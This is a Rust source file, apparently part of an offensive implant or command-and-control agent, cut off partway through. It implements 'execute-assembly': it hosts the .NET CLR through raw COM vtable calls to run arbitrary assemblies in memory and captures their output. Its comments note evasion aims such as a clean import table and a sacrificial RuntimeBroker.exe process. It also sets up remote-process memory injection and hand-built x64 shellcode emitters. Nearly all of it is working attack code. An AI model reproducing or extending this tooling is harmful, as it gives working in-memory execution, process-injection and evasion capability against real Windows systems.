//! execute-assembly — in-memory .NET assembly execution via CLR hosting.
//!
//! All Win32 / COM calls are behind `#[cfg(target_os = "windows")]`.
//! Non-Windows builds get a stub that returns an error string.
//!
//! Uses manual `extern "system"` FFI + COM vtable calls (same pattern
//! as lateral.rs).

// ─── Windows implementation ───────────────────────────────────────────

#[cfg(target_os = "windows")]
mod win {
    use anyhow::{anyhow, Result};
    use std::ffi::c_void;
    use std::ptr::{null, null_mut};

    // ── FFI declarations ─────────────────────────────────────

    #[link(name = "kernel32")]
    extern "system" {
        fn GetLastError() -> u32;
        fn GetStdHandle(nStdHandle: u32) -> isize;
        fn SetStdHandle(nStdHandle: u32, hHandle: isize) -> i32;
        fn CreatePipe(
            hReadPipe: *mut isize,
            hWritePipe: *mut isize,
            lpPipeAttributes: *const SecurityAttributes,
            nSize: u32,
        ) -> i32;
        fn ReadFile(
            hFile: isize,
            lpBuffer: *mut u8,
            nNumberOfBytesToRead: u32,
            lpNumberOfBytesRead: *mut u32,
            lpOverlapped: *mut c_void,
        ) -> i32;
        fn PeekNamedPipe(
            hNamedPipe: isize,
            lpBuffer: *mut c_void,
            nBufferSize: u32,
            lpBytesRead: *mut u32,
            lpTotalBytesAvail: *mut u32,
            lpBytesLeftThisMessage: *mut u32,
        ) -> i32;
        fn CloseHandle(hObject: isize) -> i32;
        fn LoadLibraryW(lpLibFileName: *const u16) -> isize;
        fn GetProcAddress(hModule: isize, lpProcName: *const u8) -> *const c_void;
        fn FreeLibrary(hModule: isize) -> i32;
        fn CreateNamedPipeW(
            lpName: *const u16,
            dwOpenMode: u32,
            dwPipeMode: u32,
            nMaxInstances: u32,
            nOutBufferSize: u32,
            nInBufferSize: u32,
            nDefaultTimeOut: u32,
            lpSecurityAttributes: *const SecurityAttributes,
        ) -> isize;
        fn ConnectNamedPipe(hNamedPipe: isize, lpOverlapped: *mut c_void) -> i32;
        fn CreateProcessW(
            lpApplicationName: *const u16,
            lpCommandLine: *mut u16,
            lpProcessAttributes: *const c_void,
            lpThreadAttributes: *const c_void,
            bInheritHandles: i32,
            dwCreationFlags: u32,
            lpEnvironment: *const c_void,
            lpCurrentDirectory: *const u16,
            lpStartupInfo: *const StartupInfoW,
            lpProcessInformation: *mut ProcessInformation,
        ) -> i32;
        fn VirtualAllocEx(
            hProcess: isize,
            lpAddress: *const c_void,
            dwSize: usize,
            flAllocationType: u32,
            flProtect: u32,
        ) -> *mut c_void;
        fn WriteProcessMemory(
            hProcess: isize,
            lpBaseAddress: *mut c_void,
            lpBuffer: *const c_void,
            nSize: usize,
            lpNumberOfBytesWritten: *mut usize,
        ) -> i32;
        fn VirtualProtectEx(
            hProcess: isize,
            lpAddress: *mut c_void,
            dwSize: usize,
            flNewProtect: u32,
            lpflOldProtect: *mut u32,
        ) -> i32;
        fn CreateRemoteThread(
            hProcess: isize,
            lpThreadAttributes: *const c_void,
            dwStackSize: usize,
            lpStartAddress: *const c_void,
            lpParameter: *const c_void,
            dwCreationFlags: u32,
            lpThreadId: *mut u32,
        ) -> isize;
        fn ResumeThread(hThread: isize) -> u32;
        fn WaitForSingleObject(hHandle: isize, dwMilliseconds: u32) -> u32;
        fn TerminateProcess(hProcess: isize, uExitCode: u32) -> i32;
    }

    #[link(name = "ole32")]
    extern "system" {
        fn CoInitializeEx(pvReserved: *const c_void, dwCoInit: u32) -> i32;
        fn CoUninitialize();
    }

    #[link(name = "oleaut32")]
    extern "system" {
        fn SafeArrayCreateVector(vt: u16, lLbound: i32, cElements: u32) -> *mut c_void;
        fn SafeArrayAccessData(psa: *mut c_void, ppvData: *mut *mut c_void) -> i32;
        fn SafeArrayUnaccessData(psa: *mut c_void) -> i32;
        fn SafeArrayDestroy(psa: *mut c_void) -> i32;
        fn SysAllocString(psz: *const u16) -> *mut u16;
    }

    // ── Constants ────────────────────────────────────────────

    const COINIT_MULTITHREADED: u32 = 0;
    const STD_OUTPUT_HANDLE: u32 = 0xFFFF_FFF5; // (DWORD)-11
    const STD_ERROR_HANDLE: u32 = 0xFFFF_FFF4; // (DWORD)-12
    const VT_UI1: u16 = 17; // unsigned byte
    const VT_BSTR: u16 = 8;
    const VT_VARIANT: u16 = 12;
    const VT_ARRAY: u16 = 0x2000;

    // Named pipe constants.
    const PIPE_ACCESS_INBOUND: u32 = 0x0000_0001;
    const PIPE_TYPE_BYTE: u32 = 0x0000_0000;
    const PIPE_WAIT: u32 = 0x0000_0000;
    const INVALID_HANDLE: isize = -1;

    // Process / memory constants.
    const CREATE_SUSPENDED: u32 = 0x0000_0004;
    const MEM_COMMIT: u32 = 0x0000_1000;
    const MEM_RESERVE: u32 = 0x0000_2000;
    const PAGE_READWRITE: u32 = 0x04;
    const PAGE_EXECUTE_READ: u32 = 0x20;

    const DEFAULT_SPAWN: &str = r"C:\Windows\System32\RuntimeBroker.exe";

    // ── Types ────────────────────────────────────────────────

    #[repr(C)]
    struct Guid {
        data1: u32,
        data2: u16,
        data3: u16,
        data4: [u8; 8],
    }

    #[repr(C)]
    struct SecurityAttributes {
        n_length: u32,
        lp_security_descriptor: *mut c_void,
        b_inherit_handle: i32,
    }

    #[repr(C)]
    struct StartupInfoW {
        cb: u32,
        _reserved: *mut u16,
        _desktop: *mut u16,
        _title: *mut u16,
        _dw_x: u32,
        _dw_y: u32,
        _dw_x_size: u32,
        _dw_y_size: u32,
        _dw_x_count_chars: u32,
        _dw_y_count_chars: u32,
        _dw_fill_attribute: u32,
        _dw_flags: u32,
        _w_show_window: u16,
        _cb_reserved2: u16,
        _lp_reserved2: *mut u8,
        _h_std_input: isize,
        _h_std_output: isize,
        _h_std_error: isize,
    }

    #[repr(C)]
    struct ProcessInformation {
        h_process: isize,
        h_thread: isize,
        dw_process_id: u32,
        _dw_thread_id: u32,
    }

    /// VARIANT — 8-byte header + pointer-sized union data.
    /// Total: 16 bytes on x86, 24 bytes on x64.
    #[repr(C)]
    #[derive(Copy, Clone)]
    struct Variant {
        vt: u16,
        _pad: [u16; 3],
        data: [usize; 2],
    }

    impl Variant {
        fn empty() -> Self {
            Self {
                vt: 0, // VT_EMPTY
                _pad: [0; 3],
                data: [0; 2],
            }
        }
    }

    // ── GUIDs / IIDs ─────────────────────────────────────────

    // CLSID_CLRMetaHost {9280188D-0E8E-4867-B30C-7FA83884E8DE}
    static CLSID_CLR_META_HOST: Guid = Guid {
        data1: 0x9280188D,
        data2: 0x0E8E,
        data3: 0x4867,
        data4: [0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE],
    };

    // IID_ICLRMetaHost {D332DB9E-B9B3-4125-8207-A14884F53216}
    static IID_ICLR_META_HOST: Guid = Guid {
        data1: 0xD332DB9E,
        data2: 0xB9B3,
        data3: 0x4125,
        data4: [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16],
    };

    // IID_ICLRRuntimeInfo {BD39D1D2-BA2F-486A-89B0-B4B0CB466891}
    static IID_ICLR_RUNTIME_INFO: Guid = Guid {
        data1: 0xBD39D1D2,
        data2: 0xBA2F,
        data3: 0x486A,
        data4: [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91],
    };

    // CLSID_CorRuntimeHost {CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}
    static CLSID_COR_RUNTIME_HOST: Guid = Guid {
        data1: 0xCB2F6723,
        data2: 0xAB3A,
        data3: 0x11D2,
        data4: [0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E],
    };

    // IID_ICorRuntimeHost {CB2F6722-AB3A-11D2-9C40-00C04FA30A3E}
    static IID_ICOR_RUNTIME_HOST: Guid = Guid {
        data1: 0xCB2F6722,
        data2: 0xAB3A,
        data3: 0x11D2,
        data4: [0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E],
    };

    // IID__AppDomain {05F696DC-2B29-3663-AD8B-C4389CF2A713}
    static IID_APP_DOMAIN: Guid = Guid {
        data1: 0x05F696DC,
        data2: 0x2B29,
        data3: 0x3663,
        data4: [0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13],
    };

    // ── Helpers ──────────────────────────────────────────────

    fn wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }

    /// IUnknown::Release (vtable index 2).
    fn com_release(obj: *mut c_void) {
        if obj.is_null() {
            return;
        }
        unsafe {
            let vtbl = *(obj as *const *const usize);
            let release: unsafe extern "system" fn(*mut c_void) -> u32 =
                std::mem::transmute(*vtbl.add(2));
            release(obj);
        }
    }

    /// IUnknown::QueryInterface (vtable index 0).
    unsafe fn com_qi(obj: *mut c_void, iid: *const Guid, out: *mut *mut c_void) -> i32 {
        let vtbl = *(obj as *const *const usize);
        let qi: unsafe extern "system" fn(*mut c_void, *const Guid, *mut *mut c_void) -> i32 =
            std::mem::transmute(*vtbl.add(0));
        qi(obj, iid, out)
    }

    /// Read a function pointer from a COM vtable by index.
    ///
    /// # Safety
    /// `obj` must be a valid COM interface pointer and `idx` a correct vtable slot.
    unsafe fn vtable_fn(obj: *mut c_void, idx: usize) -> usize {
        let vtbl = *(obj as *const *const usize);
        *vtbl.add(idx)
    }

    /// RAII guard — calls CoUninitialize on drop.
    struct ComGuard;
    impl Drop for ComGuard {
        fn drop(&mut self) {
            unsafe { CoUninitialize() };
        }
    }

    /// Create a SAFEARRAY of VT_UI1 (bytes) from a slice.
    unsafe fn create_byte_safearray(data: &[u8]) -> Result<*mut c_void> {
        let psa = SafeArrayCreateVector(VT_UI1, 0, data.len() as u32);
        if psa.is_null() {
            return Err(anyhow!("SafeArrayCreateVector(UI1) failed"));
        }
        let mut raw: *mut c_void = null_mut();
        let hr = SafeArrayAccessData(psa, &mut raw);
        if hr < 0 {
            SafeArrayDestroy(psa);
            return Err(anyhow!("SafeArrayAccessData: 0x{:08X}", hr as u32));
        }
        std::ptr::copy_nonoverlapping(data.as_ptr(), raw as *mut u8, data.len());
        SafeArrayUnaccessData(psa);
        Ok(psa)
    }

    /// Create a SAFEARRAY of VT_BSTR from string slices.
    unsafe fn create_bstr_safearray(strings: &[String]) -> Result<*mut c_void> {
        let psa = SafeArrayCreateVector(VT_BSTR, 0, strings.len() as u32);
        if psa.is_null() {
            return Err(anyhow!("SafeArrayCreateVector(BSTR) failed"));
        }
        let mut raw: *mut c_void = null_mut();
        let hr = SafeArrayAccessData(psa, &mut raw);
        if hr < 0 {
            SafeArrayDestroy(psa);
            return Err(anyhow!("SafeArrayAccessData(BSTR): 0x{:08X}", hr as u32));
        }
        let arr = raw as *mut *mut u16;
        for (i, s) in strings.iter().enumerate() {
            let w = wide(s);
            *arr.add(i) = SysAllocString(w.as_ptr());
        }
        SafeArrayUnaccessData(psa);
        Ok(psa)
    }

    /// Drain all available bytes from a pipe read handle.
    unsafe fn drain_pipe(read_handle: isize) -> String {
        let mut output = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            let mut avail: u32 = 0;
            if PeekNamedPipe(
                read_handle,
                null_mut(),
                0,
                null_mut(),
                &mut avail,
                null_mut(),
            ) == 0
                || avail == 0
            {
                break;
            }
            let mut n: u32 = 0;
            if ReadFile(read_handle, buf.as_mut_ptr(), buf.len() as u32, &mut n, null_mut()) == 0
                || n == 0
            {
                break;
            }
            output.extend_from_slice(&buf[..n as usize]);
        }
        String::from_utf8_lossy(&output).into_owned()
    }

    // ── COM vtable indices ───────────────────────────────────
    //
    //   ICLRMetaHost::GetRuntime          = 3
    //   ICLRRuntimeInfo::GetInterface     = 9
    //   ICorRuntimeHost::Start            = 10
    //   ICorRuntimeHost::GetDefaultDomain = 13
    //   _AppDomain::Load_3               = 41  (SAFEARRAY<UI1> → _Assembly)
    //   _Assembly::get_EntryPoint         = 16  (→ _MethodInfo)
    //   _MethodInfo::Invoke_3             = 37  (obj, params → retval)

    // COM method function-pointer type aliases.

    type CLRCreateInstanceFn = unsafe extern "system" fn(
        *const Guid,
        *const Guid,
        *mut *mut c_void,
    ) -> i32;

    type GetRuntimeFn = unsafe extern "system" fn(
        *mut c_void,      // this (ICLRMetaHost)
        *const u16,       // pwzVersion
        *const Guid,      // riid
        *mut *mut c_void, // ppRuntime
    ) -> i32;

    type GetInterfaceFn = unsafe extern "system" fn(
        *mut c_void,      // this (ICLRRuntimeInfo)
        *const Guid,      // rclsid
        *const Guid,      // riid
        *mut *mut c_void, // ppUnk
    ) -> i32;

    type StartFn = unsafe extern "system" fn(*mut c_void) -> i32;

    type GetDefaultDomainFn = unsafe extern "system" fn(
        *mut c_void,      // this (ICorRuntimeHost)
        *mut *mut c_void, // pAppDomain (IUnknown**)
    ) -> i32;

    type AppDomainLoad3Fn = unsafe extern "system" fn(
        *mut c_void,      // this (_AppDomain)
        *mut c_void,      // rawAssembly (SAFEARRAY*)
        *mut *mut c_void, // pRetVal (_Assembly**)
    ) -> i32;

    type GetEntryPointFn = unsafe extern "system" fn(
        *mut c_void,      // this (_Assembly)
        *mut *mut c_void, // pRetVal (_MethodInfo**)
    ) -> i32;

    // _MethodInfo::Invoke_3(VARIANT obj, SAFEARRAY* params, VARIANT* retval)
    // On x64 by-value VARIANT (24 bytes) is passed via implicit pointer.
    type Invoke3Fn = unsafe extern "system" fn(
        *mut c_void,      // this (_MethodInfo)
        Variant,          // obj — VT_EMPTY for static Main
        *mut c_void,      // parameters (SAFEARRAY of VARIANT)
        *mut Variant,     // pRetVal
    ) -> i32;

    // ── Core implementation ──────────────────────────────────

    unsafe fn execute_assembly_inner(
        assembly_bytes: &[u8],
        args: &[String],
    ) -> Result<(i32, String, String)> {
        // 1. Initialize COM (multithreaded apartment).
        let hr = CoInitializeEx(null(), COINIT_MULTITHREADED);
        // S_OK=0, S_FALSE=1 (already init), RPC_E_CHANGED_MODE=0x80010106 all acceptable.
        if hr < 0 && hr != 0x80010106u32 as i32 {
            return Err(anyhow!("CoInitializeEx: 0x{:08X}", hr as u32));
        }
        let _com = ComGuard;

        // 2. Load mscoree.dll dynamically (no link-time dep → clean import table).
        let mscoree = LoadLibraryW(wide("mscoree.dll").as_ptr());
        if mscoree == 0 {
            return Err(anyhow!(
                "LoadLibrary(mscoree.dll): error {} — .NET Framework installed?",
                GetLastError()
            ));
        }
        let proc = GetProcAddress(mscoree, b"CLRCreateInstance\0".as_ptr());
        if proc.is_null() {
            FreeLibrary(mscoree);
            return Err(anyhow!("CLRCreateInstance not found in mscoree.dll"));
        }
        let clr_create: CLRCreateInstanceFn = std::mem::transmute(proc);

        // 3. CLRCreateInstance → ICLRMetaHost.
        let mut meta_host: *mut c_void = null_mut();
        let hr = clr_create(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut meta_host);
        if hr < 0 {
            FreeLibrary(mscoree);
            return Err(anyhow!("CLRCreateInstance: 0x{:08X}", hr as u32));
        }

        // 4. ICLRMetaHost::GetRuntime("v4.0.30319") → ICLRRuntimeInfo.
        let ver = wide("v4.0.30319");
        let mut runtime_info: *mut c_void = null_mut();
        let get_runtime: GetRuntimeFn = std::mem::transmute(vtable_fn(meta_host, 3));
        let hr = get_runtime(meta_host, ver.as_ptr(), &IID_ICLR_RUNTIME_INFO, &mut runtime_info);
        if hr < 0 {
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!("GetRuntime(v4.0.30319): 0x{:08X}", hr as u32));
        }

        // 5. ICLRRuntimeInfo::GetInterface → ICorRuntimeHost.
        let mut runtime_host: *mut c_void = null_mut();
        let get_iface: GetInterfaceFn = std::mem::transmute(vtable_fn(runtime_info, 9));
        let hr = get_iface(
            runtime_info,
            &CLSID_COR_RUNTIME_HOST,
            &IID_ICOR_RUNTIME_HOST,
            &mut runtime_host,
        );
        if hr < 0 {
            com_release(runtime_info);
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!(
                "GetInterface(ICorRuntimeHost): 0x{:08X}",
                hr as u32
            ));
        }

        // 6. ICorRuntimeHost::Start() — S_FALSE (1) means already running, that's OK.
        let start: StartFn = std::mem::transmute(vtable_fn(runtime_host, 10));
        let hr = start(runtime_host);
        if hr < 0 {
            com_release(runtime_host);
            com_release(runtime_info);
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!("ICorRuntimeHost::Start: 0x{:08X}", hr as u32));
        }

        // 7. GetDefaultDomain → IUnknown, then QI for _AppDomain.
        let mut domain_unk: *mut c_void = null_mut();
        let get_domain: GetDefaultDomainFn = std::mem::transmute(vtable_fn(runtime_host, 13));
        let hr = get_domain(runtime_host, &mut domain_unk);
        if hr < 0 {
            com_release(runtime_host);
            com_release(runtime_info);
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!("GetDefaultDomain: 0x{:08X}", hr as u32));
        }

        let mut app_domain: *mut c_void = null_mut();
        let hr = com_qi(domain_unk, &IID_APP_DOMAIN, &mut app_domain);
        com_release(domain_unk);
        if hr < 0 {
            com_release(runtime_host);
            com_release(runtime_info);
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!("QI(_AppDomain): 0x{:08X}", hr as u32));
        }

        // 8. Redirect stdout/stderr to anonymous pipe for output capture.
        //    .NET Console lazily initialises its TextWriter from the current
        //    StdHandle, so redirecting before the assembly runs captures output.
        let mut pipe_rd: isize = 0;
        let mut pipe_wr: isize = 0;
        let sa = SecurityAttributes {
            n_length: std::mem::size_of::<SecurityAttributes>() as u32,
            lp_security_descriptor: null_mut(),
            b_inherit_handle: 1,
        };
        if CreatePipe(&mut pipe_rd, &mut pipe_wr, &sa, 0) == 0 {
            com_release(app_domain);
            com_release(runtime_host);
            com_release(runtime_info);
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!("CreatePipe: error {}", GetLastError()));
        }

        let orig_stdout = GetStdHandle(STD_OUTPUT_HANDLE);
        let orig_stderr = GetStdHandle(STD_ERROR_HANDLE);
        SetStdHandle(STD_OUTPUT_HANDLE, pipe_wr);
        SetStdHandle(STD_ERROR_HANDLE, pipe_wr);

        // Helper: restore handles and close pipe, then release COM objects.
        macro_rules! cleanup {
            ($($obj:expr),*) => {{
                CloseHandle(pipe_wr);
                SetStdHandle(STD_OUTPUT_HANDLE, orig_stdout);
                SetStdHandle(STD_ERROR_HANDLE, orig_stderr);
                let captured = drain_pipe(pipe_rd);
                CloseHandle(pipe_rd);
                $(com_release($obj);)*
                com_release(app_domain);
                com_release(runtime_host);
                com_release(runtime_info);
                com_release(meta_host);
                FreeLibrary(mscoree);
                captured
            }};
        }

        // 9. _AppDomain::Load_3(SAFEARRAY<UI1>) → _Assembly.
        let sa_bytes = match create_byte_safearray(assembly_bytes) {
            Ok(sa) => sa,
            Err(e) => {
                let _ = cleanup!();
                return Err(e);
            }
        };
        let mut assembly: *mut c_void = null_mut();
        let load3: AppDomainLoad3Fn = std::mem::transmute(vtable_fn(app_domain, 41));
        let hr = load3(app_domain, sa_bytes, &mut assembly);
        SafeArrayDestroy(sa_bytes);
        if hr < 0 {
            let captured = cleanup!();
            return Err(anyhow!(
                "AppDomain::Load_3: 0x{:08X}{}",
                hr as u32,
                if captured.is_empty() {
                    String::new()
                } else {
                    format!("\n{}", captured)
                }
            ));
        }

        // 10. _Assembly::get_EntryPoint → _MethodInfo.
        let mut entry_point: *mut c_void = null_mut();
        let get_ep: GetEntryPointFn = std::mem::transmute(vtable_fn(assembly, 16));
        let hr = get_ep(assembly, &mut entry_point);
        if hr < 0 || entry_point.is_null() {
            let captured = cleanup!(assembly);
            return Err(anyhow!(
                "get_EntryPoint: 0x{:08X} (is this a DLL without Main?){}",
                hr as u32,
                if captured.is_empty() {
                    String::new()
                } else {
                    format!("\n{}", captured)
                }
            ));
        }

        // 11. Build parameters SAFEARRAY and invoke _MethodInfo::Invoke_3.
        //
        //     For Main(string[] args):
        //       outer SAFEARRAY(VARIANT) has 1 element — a VT_ARRAY|VT_BSTR variant
        //       pointing to the inner SAFEARRAY(BSTR).
        //
        //     For Main() with no params:
        //       outer SAFEARRAY(VARIANT) has 0 elements.
        let invoke: Invoke3Fn = std::mem::transmute(vtable_fn(entry_point, 37));

        // Build inner SAFEARRAY(BSTR) for string[] args.
        let sa_strings = match create_bstr_safearray(args) {
            Ok(sa) => sa,
            Err(e) => {
                let _ = cleanup!(entry_point, assembly);
                return Err(e);
            }
        };

        // Wrap into outer SAFEARRAY(VARIANT) with 1 element.
        let params_sa = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        if params_sa.is_null() {
            SafeArrayDestroy(sa_strings);
            let _ = cleanup!(entry_point, assembly);
            return Err(anyhow!("SafeArrayCreateVector(VARIANT) failed"));
        }
        let args_var = Variant {
            vt: VT_ARRAY | VT_BSTR,
            _pad: [0; 3],
            data: [sa_strings as usize, 0],
        };
        let mut pdata: *mut c_void = null_mut();
        SafeArrayAccessData(params_sa, &mut pdata);
        std::ptr::copy_nonoverlapping(
            &args_var as *const _ as *const u8,
            pdata as *mut u8,
            std::mem::size_of::<Variant>(),
        );
        SafeArrayUnaccessData(params_sa);
        // params_sa now owns sa_strings (SafeArrayDestroy will VariantClear it).

        let mut retval = Variant::empty();
        let hr = invoke(entry_point, Variant::empty(), params_sa, &mut retval);

        // If invoke failed, retry without parameters (Main() with no args).
        let invoke_hr = if hr < 0 {
            let empty_params = SafeArrayCreateVector(VT_VARIANT, 0, 0);
            if !empty_params.is_null() {
                let mut retval2 = Variant::empty();
                let hr2 = invoke(entry_point, Variant::empty(), empty_params, &mut retval2);
                SafeArrayDestroy(empty_params);
                if hr2 >= 0 { hr2 } else { hr }
            } else {
                hr
            }
        } else {
            hr
        };

        // 12. Cleanup params (destroys nested sa_strings via VariantClear).
        SafeArrayDestroy(params_sa);

        // 13. Capture output and release everything.
        let captured = cleanup!(entry_point, assembly);

        if invoke_hr < 0 {
            Ok((
                1,
                captured,
                format!("Invoke_3: 0x{:08X}", invoke_hr as u32),
            ))
        } else {
            Ok((0, captured, String::new()))
        }
    }

    /// Inline mode: execute assembly in agent process (60s timeout).
    pub async fn execute_assembly_inline(
        assembly_bytes: Vec<u8>,
        args: Vec<String>,
    ) -> Result<(i32, String, String)> {
        let handle = tokio::task::spawn_blocking(move || unsafe {
            execute_assembly_inner(&assembly_bytes, &args)
        });
        match tokio::time::timeout(std::time::Duration::from_secs(60), handle).await {
            Ok(Ok(result)) => result,
            Ok(Err(e)) => Ok((1, String::new(), format!("assembly thread panicked: {}", e))),
            Err(_) => Ok((
                1,
                String::new(),
                "execute-assembly timed out (60s)".to_string(),
            )),
        }
    }

    // ── Spawn+Execute mode ────────────────────────────────────
    //
    // Spawn a sacrificial process, inject CLR hosting shellcode + assembly
    // data, and capture output via a named pipe.

    /// Generate a random pipe name.
    fn random_pipe_name() -> String {
        let id: u64 = rand::random();
        format!(r"\\.\pipe\cloakcat_{:016x}", id)
    }

    /// Encode a GUID as 16 little-endian bytes (COM binary layout).
    fn guid_bytes(d1: u32, d2: u16, d3: u16, d4: [u8; 8]) -> [u8; 16] {
        let mut b = [0u8; 16];
        b[0..4].copy_from_slice(&d1.to_le_bytes());
        b[4..6].copy_from_slice(&d2.to_le_bytes());
        b[6..8].copy_from_slice(&d3.to_le_bytes());
        b[8..16].copy_from_slice(&d4);
        b
    }

    // ── x64 shellcode emit helpers ──
    // All offsets are data-block-relative (rbx = data block base).

    fn d32(v: usize) -> [u8; 4] { (v as i32).to_le_bytes() }

    fn lea_rcx_rbx(c: &mut Vec<u8>, o: usize) { c.extend(&[0x48,0x8D,0x8B]); c.extend(&d32(o)); }
    fn lea_rdx_rbx(c: &mut Vec<u8>, o: usize) { c.extend(&[0x48,0x8D,0x93]); c.extend(&d32(o)); }
    fn lea_r8_rbx(c: &mut Vec<u8>, o: usize)  { c.extend(&[0x4C,0x8D,0x83]); c.extend(&d32(o)); }
    fn lea_r8_rsp(c: &mut Vec<u8>, o: usize)  { c.extend(&[0x4C,0x8D,0x84,0x24]); c.extend(&d32(o)); }
    fn lea_r9_rsp(c: &mut Vec<u8>, o: usize)  { c.extend(&[0x4C,0x8D,0x8C,0x24]); c.extend(&d32(o)); }
    fn lea_rdx_rsp(c: &mut Vec<u8>, o: usize) { c.extend(&[0x48,0x8D,0x94,0x24]); c.extend(&d32(o)); }
    fn lea_rsi_rbx(c: &mut Vec<u8>, o: usize) { c.extend(&[0x48,0x8D,0xB3]); c.extend(&d32(o)); }
    fn lea_rdi_rbx(c: &mut Vec<u8>, o: usize) { c.extend(&[0x48,0x8D,0xBB]); c.extend(&d32(o)); }
    fn call_rbx(c: &mut Vec<u8>, o: usize)    { c.extend(&[0xFF,0x93]); c.extend(&d32(o)); }
    fn call_rsp(c: &mut Vec<u8>, o: usize)    { c.extend(&[0xFF,0x94,0x24]); c.extend(&d32(o)); }
    fn st_rsp_rax(c: &mut Vec<u8>, o: usize)  { c.extend(&[0x48,0x89,0x84,0x24]); c.extend(&d32(o)); }
    fn ld_rcx_rsp(c: &mut Vec<u8>, o: usize)  { c.extend(&[0x48,0x8B,0x8C,0x24]); c.extend(&d32(o)); }
    fn ld_rax_rsp(c: &mut Vec<u8>, o: usize)  { c.extend(&[0x48,0x8B,0x84,0x24]); c.extend(&d32(o)); }
    fn ld_rdi_rsp(c: &mut Vec<u8>, o: usize)  { c.extend(&[0x48,0x8B,0xBC,0x24]); c.extend(&d32(o)); }
    fn ld_rsi_rsp(c: &mut Vec<u8>, o: usize)  { c.extend(&[0x48,0x8B,0xB4,0x24]); c.extend(&d32(o)); }
    fn ld_r8d_rbx(c: &mut Vec<u8>, o: usize)  { c.extend(&[0x44,0x8B,0x83]); c.extend(&d32(o)); }
    fn ld_ecx_rbx(c: &mut Vec<u8>, o: usize)  { c.extend(&[0x8B,0x8B]); c.extend(&d32(o)); }
    fn ld_r14d_rbx(c: &mut Vec<u8>, o: usize) { c.extend(&[0x44,0x8B,0xB3]); c.extend(&d32(o)); }

    /// COM vtable call: mov rax,[rcx]; call [rax + slot*8].
    fn vtcall(c: &mut Vec<u8>, slot: u32) {
        c.extend(&[0x48,0x8B,0x01]); // mov rax, [rcx]
        let off = (slot * 8) as i32;
        if off <= 0x7F {
            c.extend(&[0xFF,0x50, off as u8]);
        } else {
            c.extend(&[0xFF,0x90]);
            c.extend(&off.to_le_bytes());
        }
    }

    /// Offsets into the data block for shellcode field access.
    #[allow(dead_code)]
    struct ShellcodeOffsets {
        fn_llw: usize,            // LoadLibraryW
        fn_gpa: usize,            // GetProcAddress
        fn_cfw: usize,            // CreateFileW
        fn_ssh: usize,            // SetStdHandle
        fn_ch: usize,             // CloseHandle
        fn_et: usize,             // ExitThread
        str_mscoree: usize,
        str_ole32: usize,
        str_oleaut32: usize,
        str_clr_create: usize,    // "CLRCreateInstance"
        str_co_init: usize,       // "CoInitializeEx"
        str_co_uninit: usize,     // "CoUninitialize"
        str_sa_create: usize,
        str_sa_access: usize,
        str_sa_unaccess: usize,
        str_sa_destroy: usize,
        str_sysalloc: usize,
        str_v4: usize,            // L"v4.0.30319"
        clsid_mh: usize,
        iid_mh: usize,
        iid_ri: usize,
        clsid_crh: usize,
        iid_crh: usize,
        iid_ad: usize,
        pipe_name: usize,
        asm_len: usize,           // u32 field for assembly length
        asm_data: usize,          // assembly bytes start
        args_count: usize,        // u32 field for args count
        args_data: usize,         // args data start
    }

    /// Build the data block containing function pointers, GUIDs, strings,
    /// assembly bytes, and args for injection into the child process.
    /// Returns `(data_block_bytes, offsets_for_shellcode, fn_pointer_offsets)`.
    fn build_data_block(
        assembly: &[u8],
        args: &[String],
        pipe_name: &str,
    ) -> (Vec<u8>, ShellcodeOffsets) {
        let mut d = Vec::with_capacity(assembly.len() + 4096);
        let mut put_u64 = |v: &mut Vec<u8>, val: u64| -> usize {
            let p = v.len(); v.extend(&val.to_le_bytes()); p
        };
        let mut put_u32_val = |v: &mut Vec<u8>, val: u32| -> usize {
            let p = v.len(); v.extend(&val.to_le_bytes()); p
        };
        let put_wide = |v: &mut Vec<u8>, s: &str| -> usize {
            let p = v.len();
            for ch in s.encode_utf16().chain(std::iter::once(0)) {
                v.extend(&ch.to_le_bytes());
            }
            p
        };
        let put_ascii = |v: &mut Vec<u8>, s: &str| -> usize {
            let p = v.len();
            v.extend(s.as_bytes());
            v.push(0);
            p
        };
        let put_bytes = |v: &mut Vec<u8>, b: &[u8]| -> usize {
            let p = v.len(); v.extend(b); p
        };

        // Kernel32 function pointers (patched after build).
        let fn_llw = put_u64(&mut d, 0);
        let fn_gpa = put_u64(&mut d, 0);
        let fn_cfw = put_u64(&mut d, 0);
        let fn_ssh = put_u64(&mut d, 0);
        let fn_ch  = put_u64(&mut d, 0);
        let fn_et  = put_u64(&mut d, 0);

        // String constants.
        let str_mscoree   = put_wide(&mut d, "mscoree.dll");
        let str_ole32     = put_wide(&mut d, "ole32.dll");
        let str_oleaut32  = put_wide(&mut d, "oleaut32.dll");
        let str_clr_create= put_ascii(&mut d, "CLRCreateInstance");
        let str_co_init   = put_ascii(&mut d, "CoInitializeEx");
        let str_co_uninit = put_ascii(&mut d, "CoUninitialize");
        let str_sa_create = put_ascii(&mut d, "SafeArrayCreateVector");
        let str_sa_access = put_ascii(&mut d, "SafeArrayAccessData");
        let str_sa_unaccess = put_ascii(&mut d, "SafeArrayUnaccessData");
        let str_sa_destroy= put_ascii(&mut d, "SafeArrayDestroy");
        let str_sysalloc  = put_ascii(&mut d, "SysAllocString");
        let str_v4        = put_wide(&mut d, "v4.0.30319");

        // GUIDs.
        let clsid_mh = put_bytes(&mut d, &guid_bytes(0x9280188D,0x0E8E,0x4867,[0xB3,0x0C,0x7F,0xA8,0x38,0x84,0xE8,0xDE]));
